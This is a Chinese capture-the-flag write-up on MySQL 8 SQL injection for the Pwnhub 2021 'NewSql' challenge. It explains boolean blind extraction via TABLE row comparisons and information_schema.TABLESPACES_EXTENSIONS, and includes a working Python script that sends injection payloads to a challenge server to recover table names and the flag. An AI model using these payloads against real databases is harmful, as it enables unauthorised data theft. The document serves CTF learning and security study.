# Pwnhub2021七月赛NewSql（mysql8注入）



## 前言

以前虽然知道mysql8的sql注入，但是没有真正的去了解过，正好昨天晚上知道了pwnhub最近的比赛里出了这道题，就顺便复现，学习一下mysql8的SQL注入新特性。



## 学习文章

[MYSQL8.0注入新特性](https://xz.aliyun.com/t/8646)

通过这篇文章学习一下基础的知识。

## 

## 基础知识补充

文章中使用了`information_schema.SCHEMA`等来得到数据库，然后得到数据表，但实际上有这么个数据表`information_schema.TABLESPACES_EXTENSIONS`：

![pic35](D:\this_is_feng\github\CTF\Web\picture\pic35.png)

从mysql8.0.21开始出现的，但是`table`关键字是出现在8.0.19之后，所以如果想要使用，还是要试试这个表有没有，如果题目的mysql版本正好在8.0.19-8.0.21之间的话，就不能用了。

这个表好用就好用在，它直接存储了数据库和数据表：

```
mysql> table information_schema.TABLESPACES_EXTENSIONS;
+------------------+------------------+
| TABLESPACE_NAME  | ENGINE_ATTRIBUTE |
+------------------+------------------+
| mysql            | NULL             |
| innodb_system    | NULL             |
| innodb_temporary | NULL             |
| innodb_undo_001  | NULL             |
| innodb_undo_002  | NULL             |
| sys/sys_config   | NULL             |
| users/users      | NULL             |
+------------------+------------------+
7 rows in set (0.00 sec)

```

看到最后的`users/users`，因为我创建了一个users数据库，里面有users数据表。所以有了这个，就会方便很多。



此外，我个人遇到的，利用mysql8的新特性进行注入会有4个坑点。

**第一个坑点**：

```sql
mysql> table information_schema.TABLESPACES_EXTENSIONS limit 6,1;
+-----------------+------------------+
| TABLESPACE_NAME | ENGINE_ATTRIBUTE |
+-----------------+------------------+
| users/users     | NULL             |
+-----------------+------------------+
1 row in set (0.00 sec)

mysql> select (('t','')<(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));
+------------------------------------------------------------------------+
| (('t','')<(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |
+------------------------------------------------------------------------+
|                                                                      1 |
+------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select (('u','')<(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));
+------------------------------------------------------------------------+
| (('u','')<(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |
+------------------------------------------------------------------------+
|                                                                      1 |
+------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select (('v','')<(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));
+------------------------------------------------------------------------+
| (('v','')<(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |
+------------------------------------------------------------------------+
|                                                                      0 |
+------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql>

```

用的是小于号，第一列的值是`users/users`，所以正常思维是，如果是`t`的话确实会小于，得到的是1。但是如果是`u`的话，就不是小于了而是等于，所以该返回0。但实际上，这里即使是用小于，但是比较的结果还是小于等于。所以需要将比较得到的结果的ascii-1再转换成字符才可以。



**第二个坑点**：

```sql
mysql> select (('users/userr','')<(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));
+----------------------------------------------------------------------------------+
| (('users/userr','')<(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |
+----------------------------------------------------------------------------------+
|                                                                                1 |
+----------------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select (('users/users','')<(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));
+----------------------------------------------------------------------------------+
| (('users/users','')<(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |
+----------------------------------------------------------------------------------+
|                                                                             NULL |
+----------------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql>

```

可以发现在爆最后一位的时候，情况又和之前的不一样了。最后一位的比较就是小于，不是小于等于了。所以对于最后一位还需要特别注意。

还需要注意的是，如果那一列是只有一个字符的话，还是按小于等于来比较，不是小于。

**第三个坑点**

类型上的问题：

```sql
mysql> select (('1','','')<(table users.users limit 0,1));
+---------------------------------------------+
| (('1','','')<(table users.users limit 0,1)) |
+---------------------------------------------+
|                                           1 |
+---------------------------------------------+
1 row in set (0.00 sec)

mysql> select (('2','','')<(table users.users limit 0,1));
+---------------------------------------------+
| (('2','','')<(table users.users limit 0,1)) |
+---------------------------------------------+
|                                           0 |
+---------------------------------------------+
1 row in set (0.00 sec)

mysql> select (('1!','','')<(table users.users limit 0,1));
+----------------------------------------------+
| (('1!','','')<(table users.users limit 0,1)) |
+----------------------------------------------+
|                                            1 |
+----------------------------------------------+
1 row in set (0.00 sec)

mysql>

```



这个反应了什么问题呢？第一列是id，id是int类型，而这里第一列给的是字符型。写python脚本爆破的时候，爆出第一位是1之后，还会对第二位进行爆破，正常就会在第二位这里没有结果，因为要爆的那个字段的位数没你给的多。但是这种情况的问题就是，id是int型，字符串和int型比较的时候，因为我们的字符串以数字开头，因此都会转换成int进行比较，所以就不是字符串比较了，会出问题。



**第四个坑点**

大小写的问题。在对最后数据表的字段爆破的时候，最好加上binary，我猜测可能是因为这个：

> `lower_case_table_names` 的值：
>
> - 如果设置为 0，表名将按指定方式存储，并且在对比表名时区分大小写。
> - 如果设置为 1，表名将以小写形式存储在磁盘上，在对比表名时不区分大小写。
> - 如果设置为 2，则表名按给定格式存储，但以小写形式进行比较。
>
> 此选项还适用于数据库名称和表别名。有关其他详细信息，请参阅第 9.2.3 节 “[标识符区分大小写](https://dev.mysql.com/doc/refman/8.0/en/identifier-case-sensitivity.html)"。
>
> 由于 MySQL 最初依赖于文件系统来作为其数据字典，因此默认设置是依赖于文件系统是否 区分大小写。
>
> 在 Windows 上，默认值为 1。在 macOS 上，默认值是 2。在 Linux 上，不支持值 2；服 务器会将该值设置为 0。

因为题目大多是在linux上，所以这个的值为0，所以爆表名库名之类的时候，即使不加上`binary`，也会区分大小写，但是对于真正的数据表，如果不加上`binary`的话，是不区分大小写的，所以会出问题。



## WP

回到题目上来。这题具体的也就不分析了，简单的尝试一下写python脚本来爆破的过程叭。

python脚本：

```python
import requests

url="http://47.99.38.177:10084"

flag=""
for i in range(100):
    for j in "/0123456789:;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_.{|}~":
        #payload="1'^((binary'{}','')<(table/**/information_schema.TABLESPACES_EXTENSIONS/**/limit/**/6,1))#".format(flag+chr(j))
        #payload="1'^((binary'{}','')<(table/**/information_schema.TABLESPACES_EXTENSIONS/**/limit/**/7,1))#".format(flag+chr(j))
        payload="1'^(('1',binary'{}')<(table/**/f1aggghere))#".format(flag+j)


        #payload="1'^((binary'ctf/users','')<(table/**/information_schema.TABLESPACES_EXTENSIONS/**/limit/**/6,1))#"
        data={
            'username':payload,
            'password':1
        }
        r=requests.post(url=url,data=data)
        #print(len(r.text))
        if len(r.text) == 1742:
            flag += chr(ord(j)-1)
            print(flag)
            break
        if j == "~":
            flag = flag[:len(flag)-1]+chr(ord(flag[-1])+1)
            print(flag)
            exit()


"最后一位不需要偏移"
"ctf/users"
"ctf/f1aggghere"
```



首先要爆出数据库和表：

```python
        payload="1'^((binary'{}','')<(table/**/information_schema.TABLESPACES_EXTENSIONS/**/limit/**/6,1))#".format(flag+chr(j))
        payload="1'^((binary'{}','')<(table/**/information_schema.TABLESPACES_EXTENSIONS/**/limit/**/7,1))#".format(flag+chr(j))
```

通过这两个可以得到

```python
"ctf/users"
"ctf/f1aggghere"
```

然后对`flag`表的列数进行test，发现有2列。第一列就遇到了类型的问题。

然后爆flag即可：

```python
payload="1'^(('1',binary'{}')<(table/**/f1aggghere))#".format(flag+j)
```

加上binary区分大小写。



最后的判断：

```python
        if j == "~":
            flag = flag[:len(flag)-1]+chr(ord(flag[-1])+1)
            print(flag)
            exit()
```

其实就是上面提到的坑点二，用来纠正最后一位的ascii-1。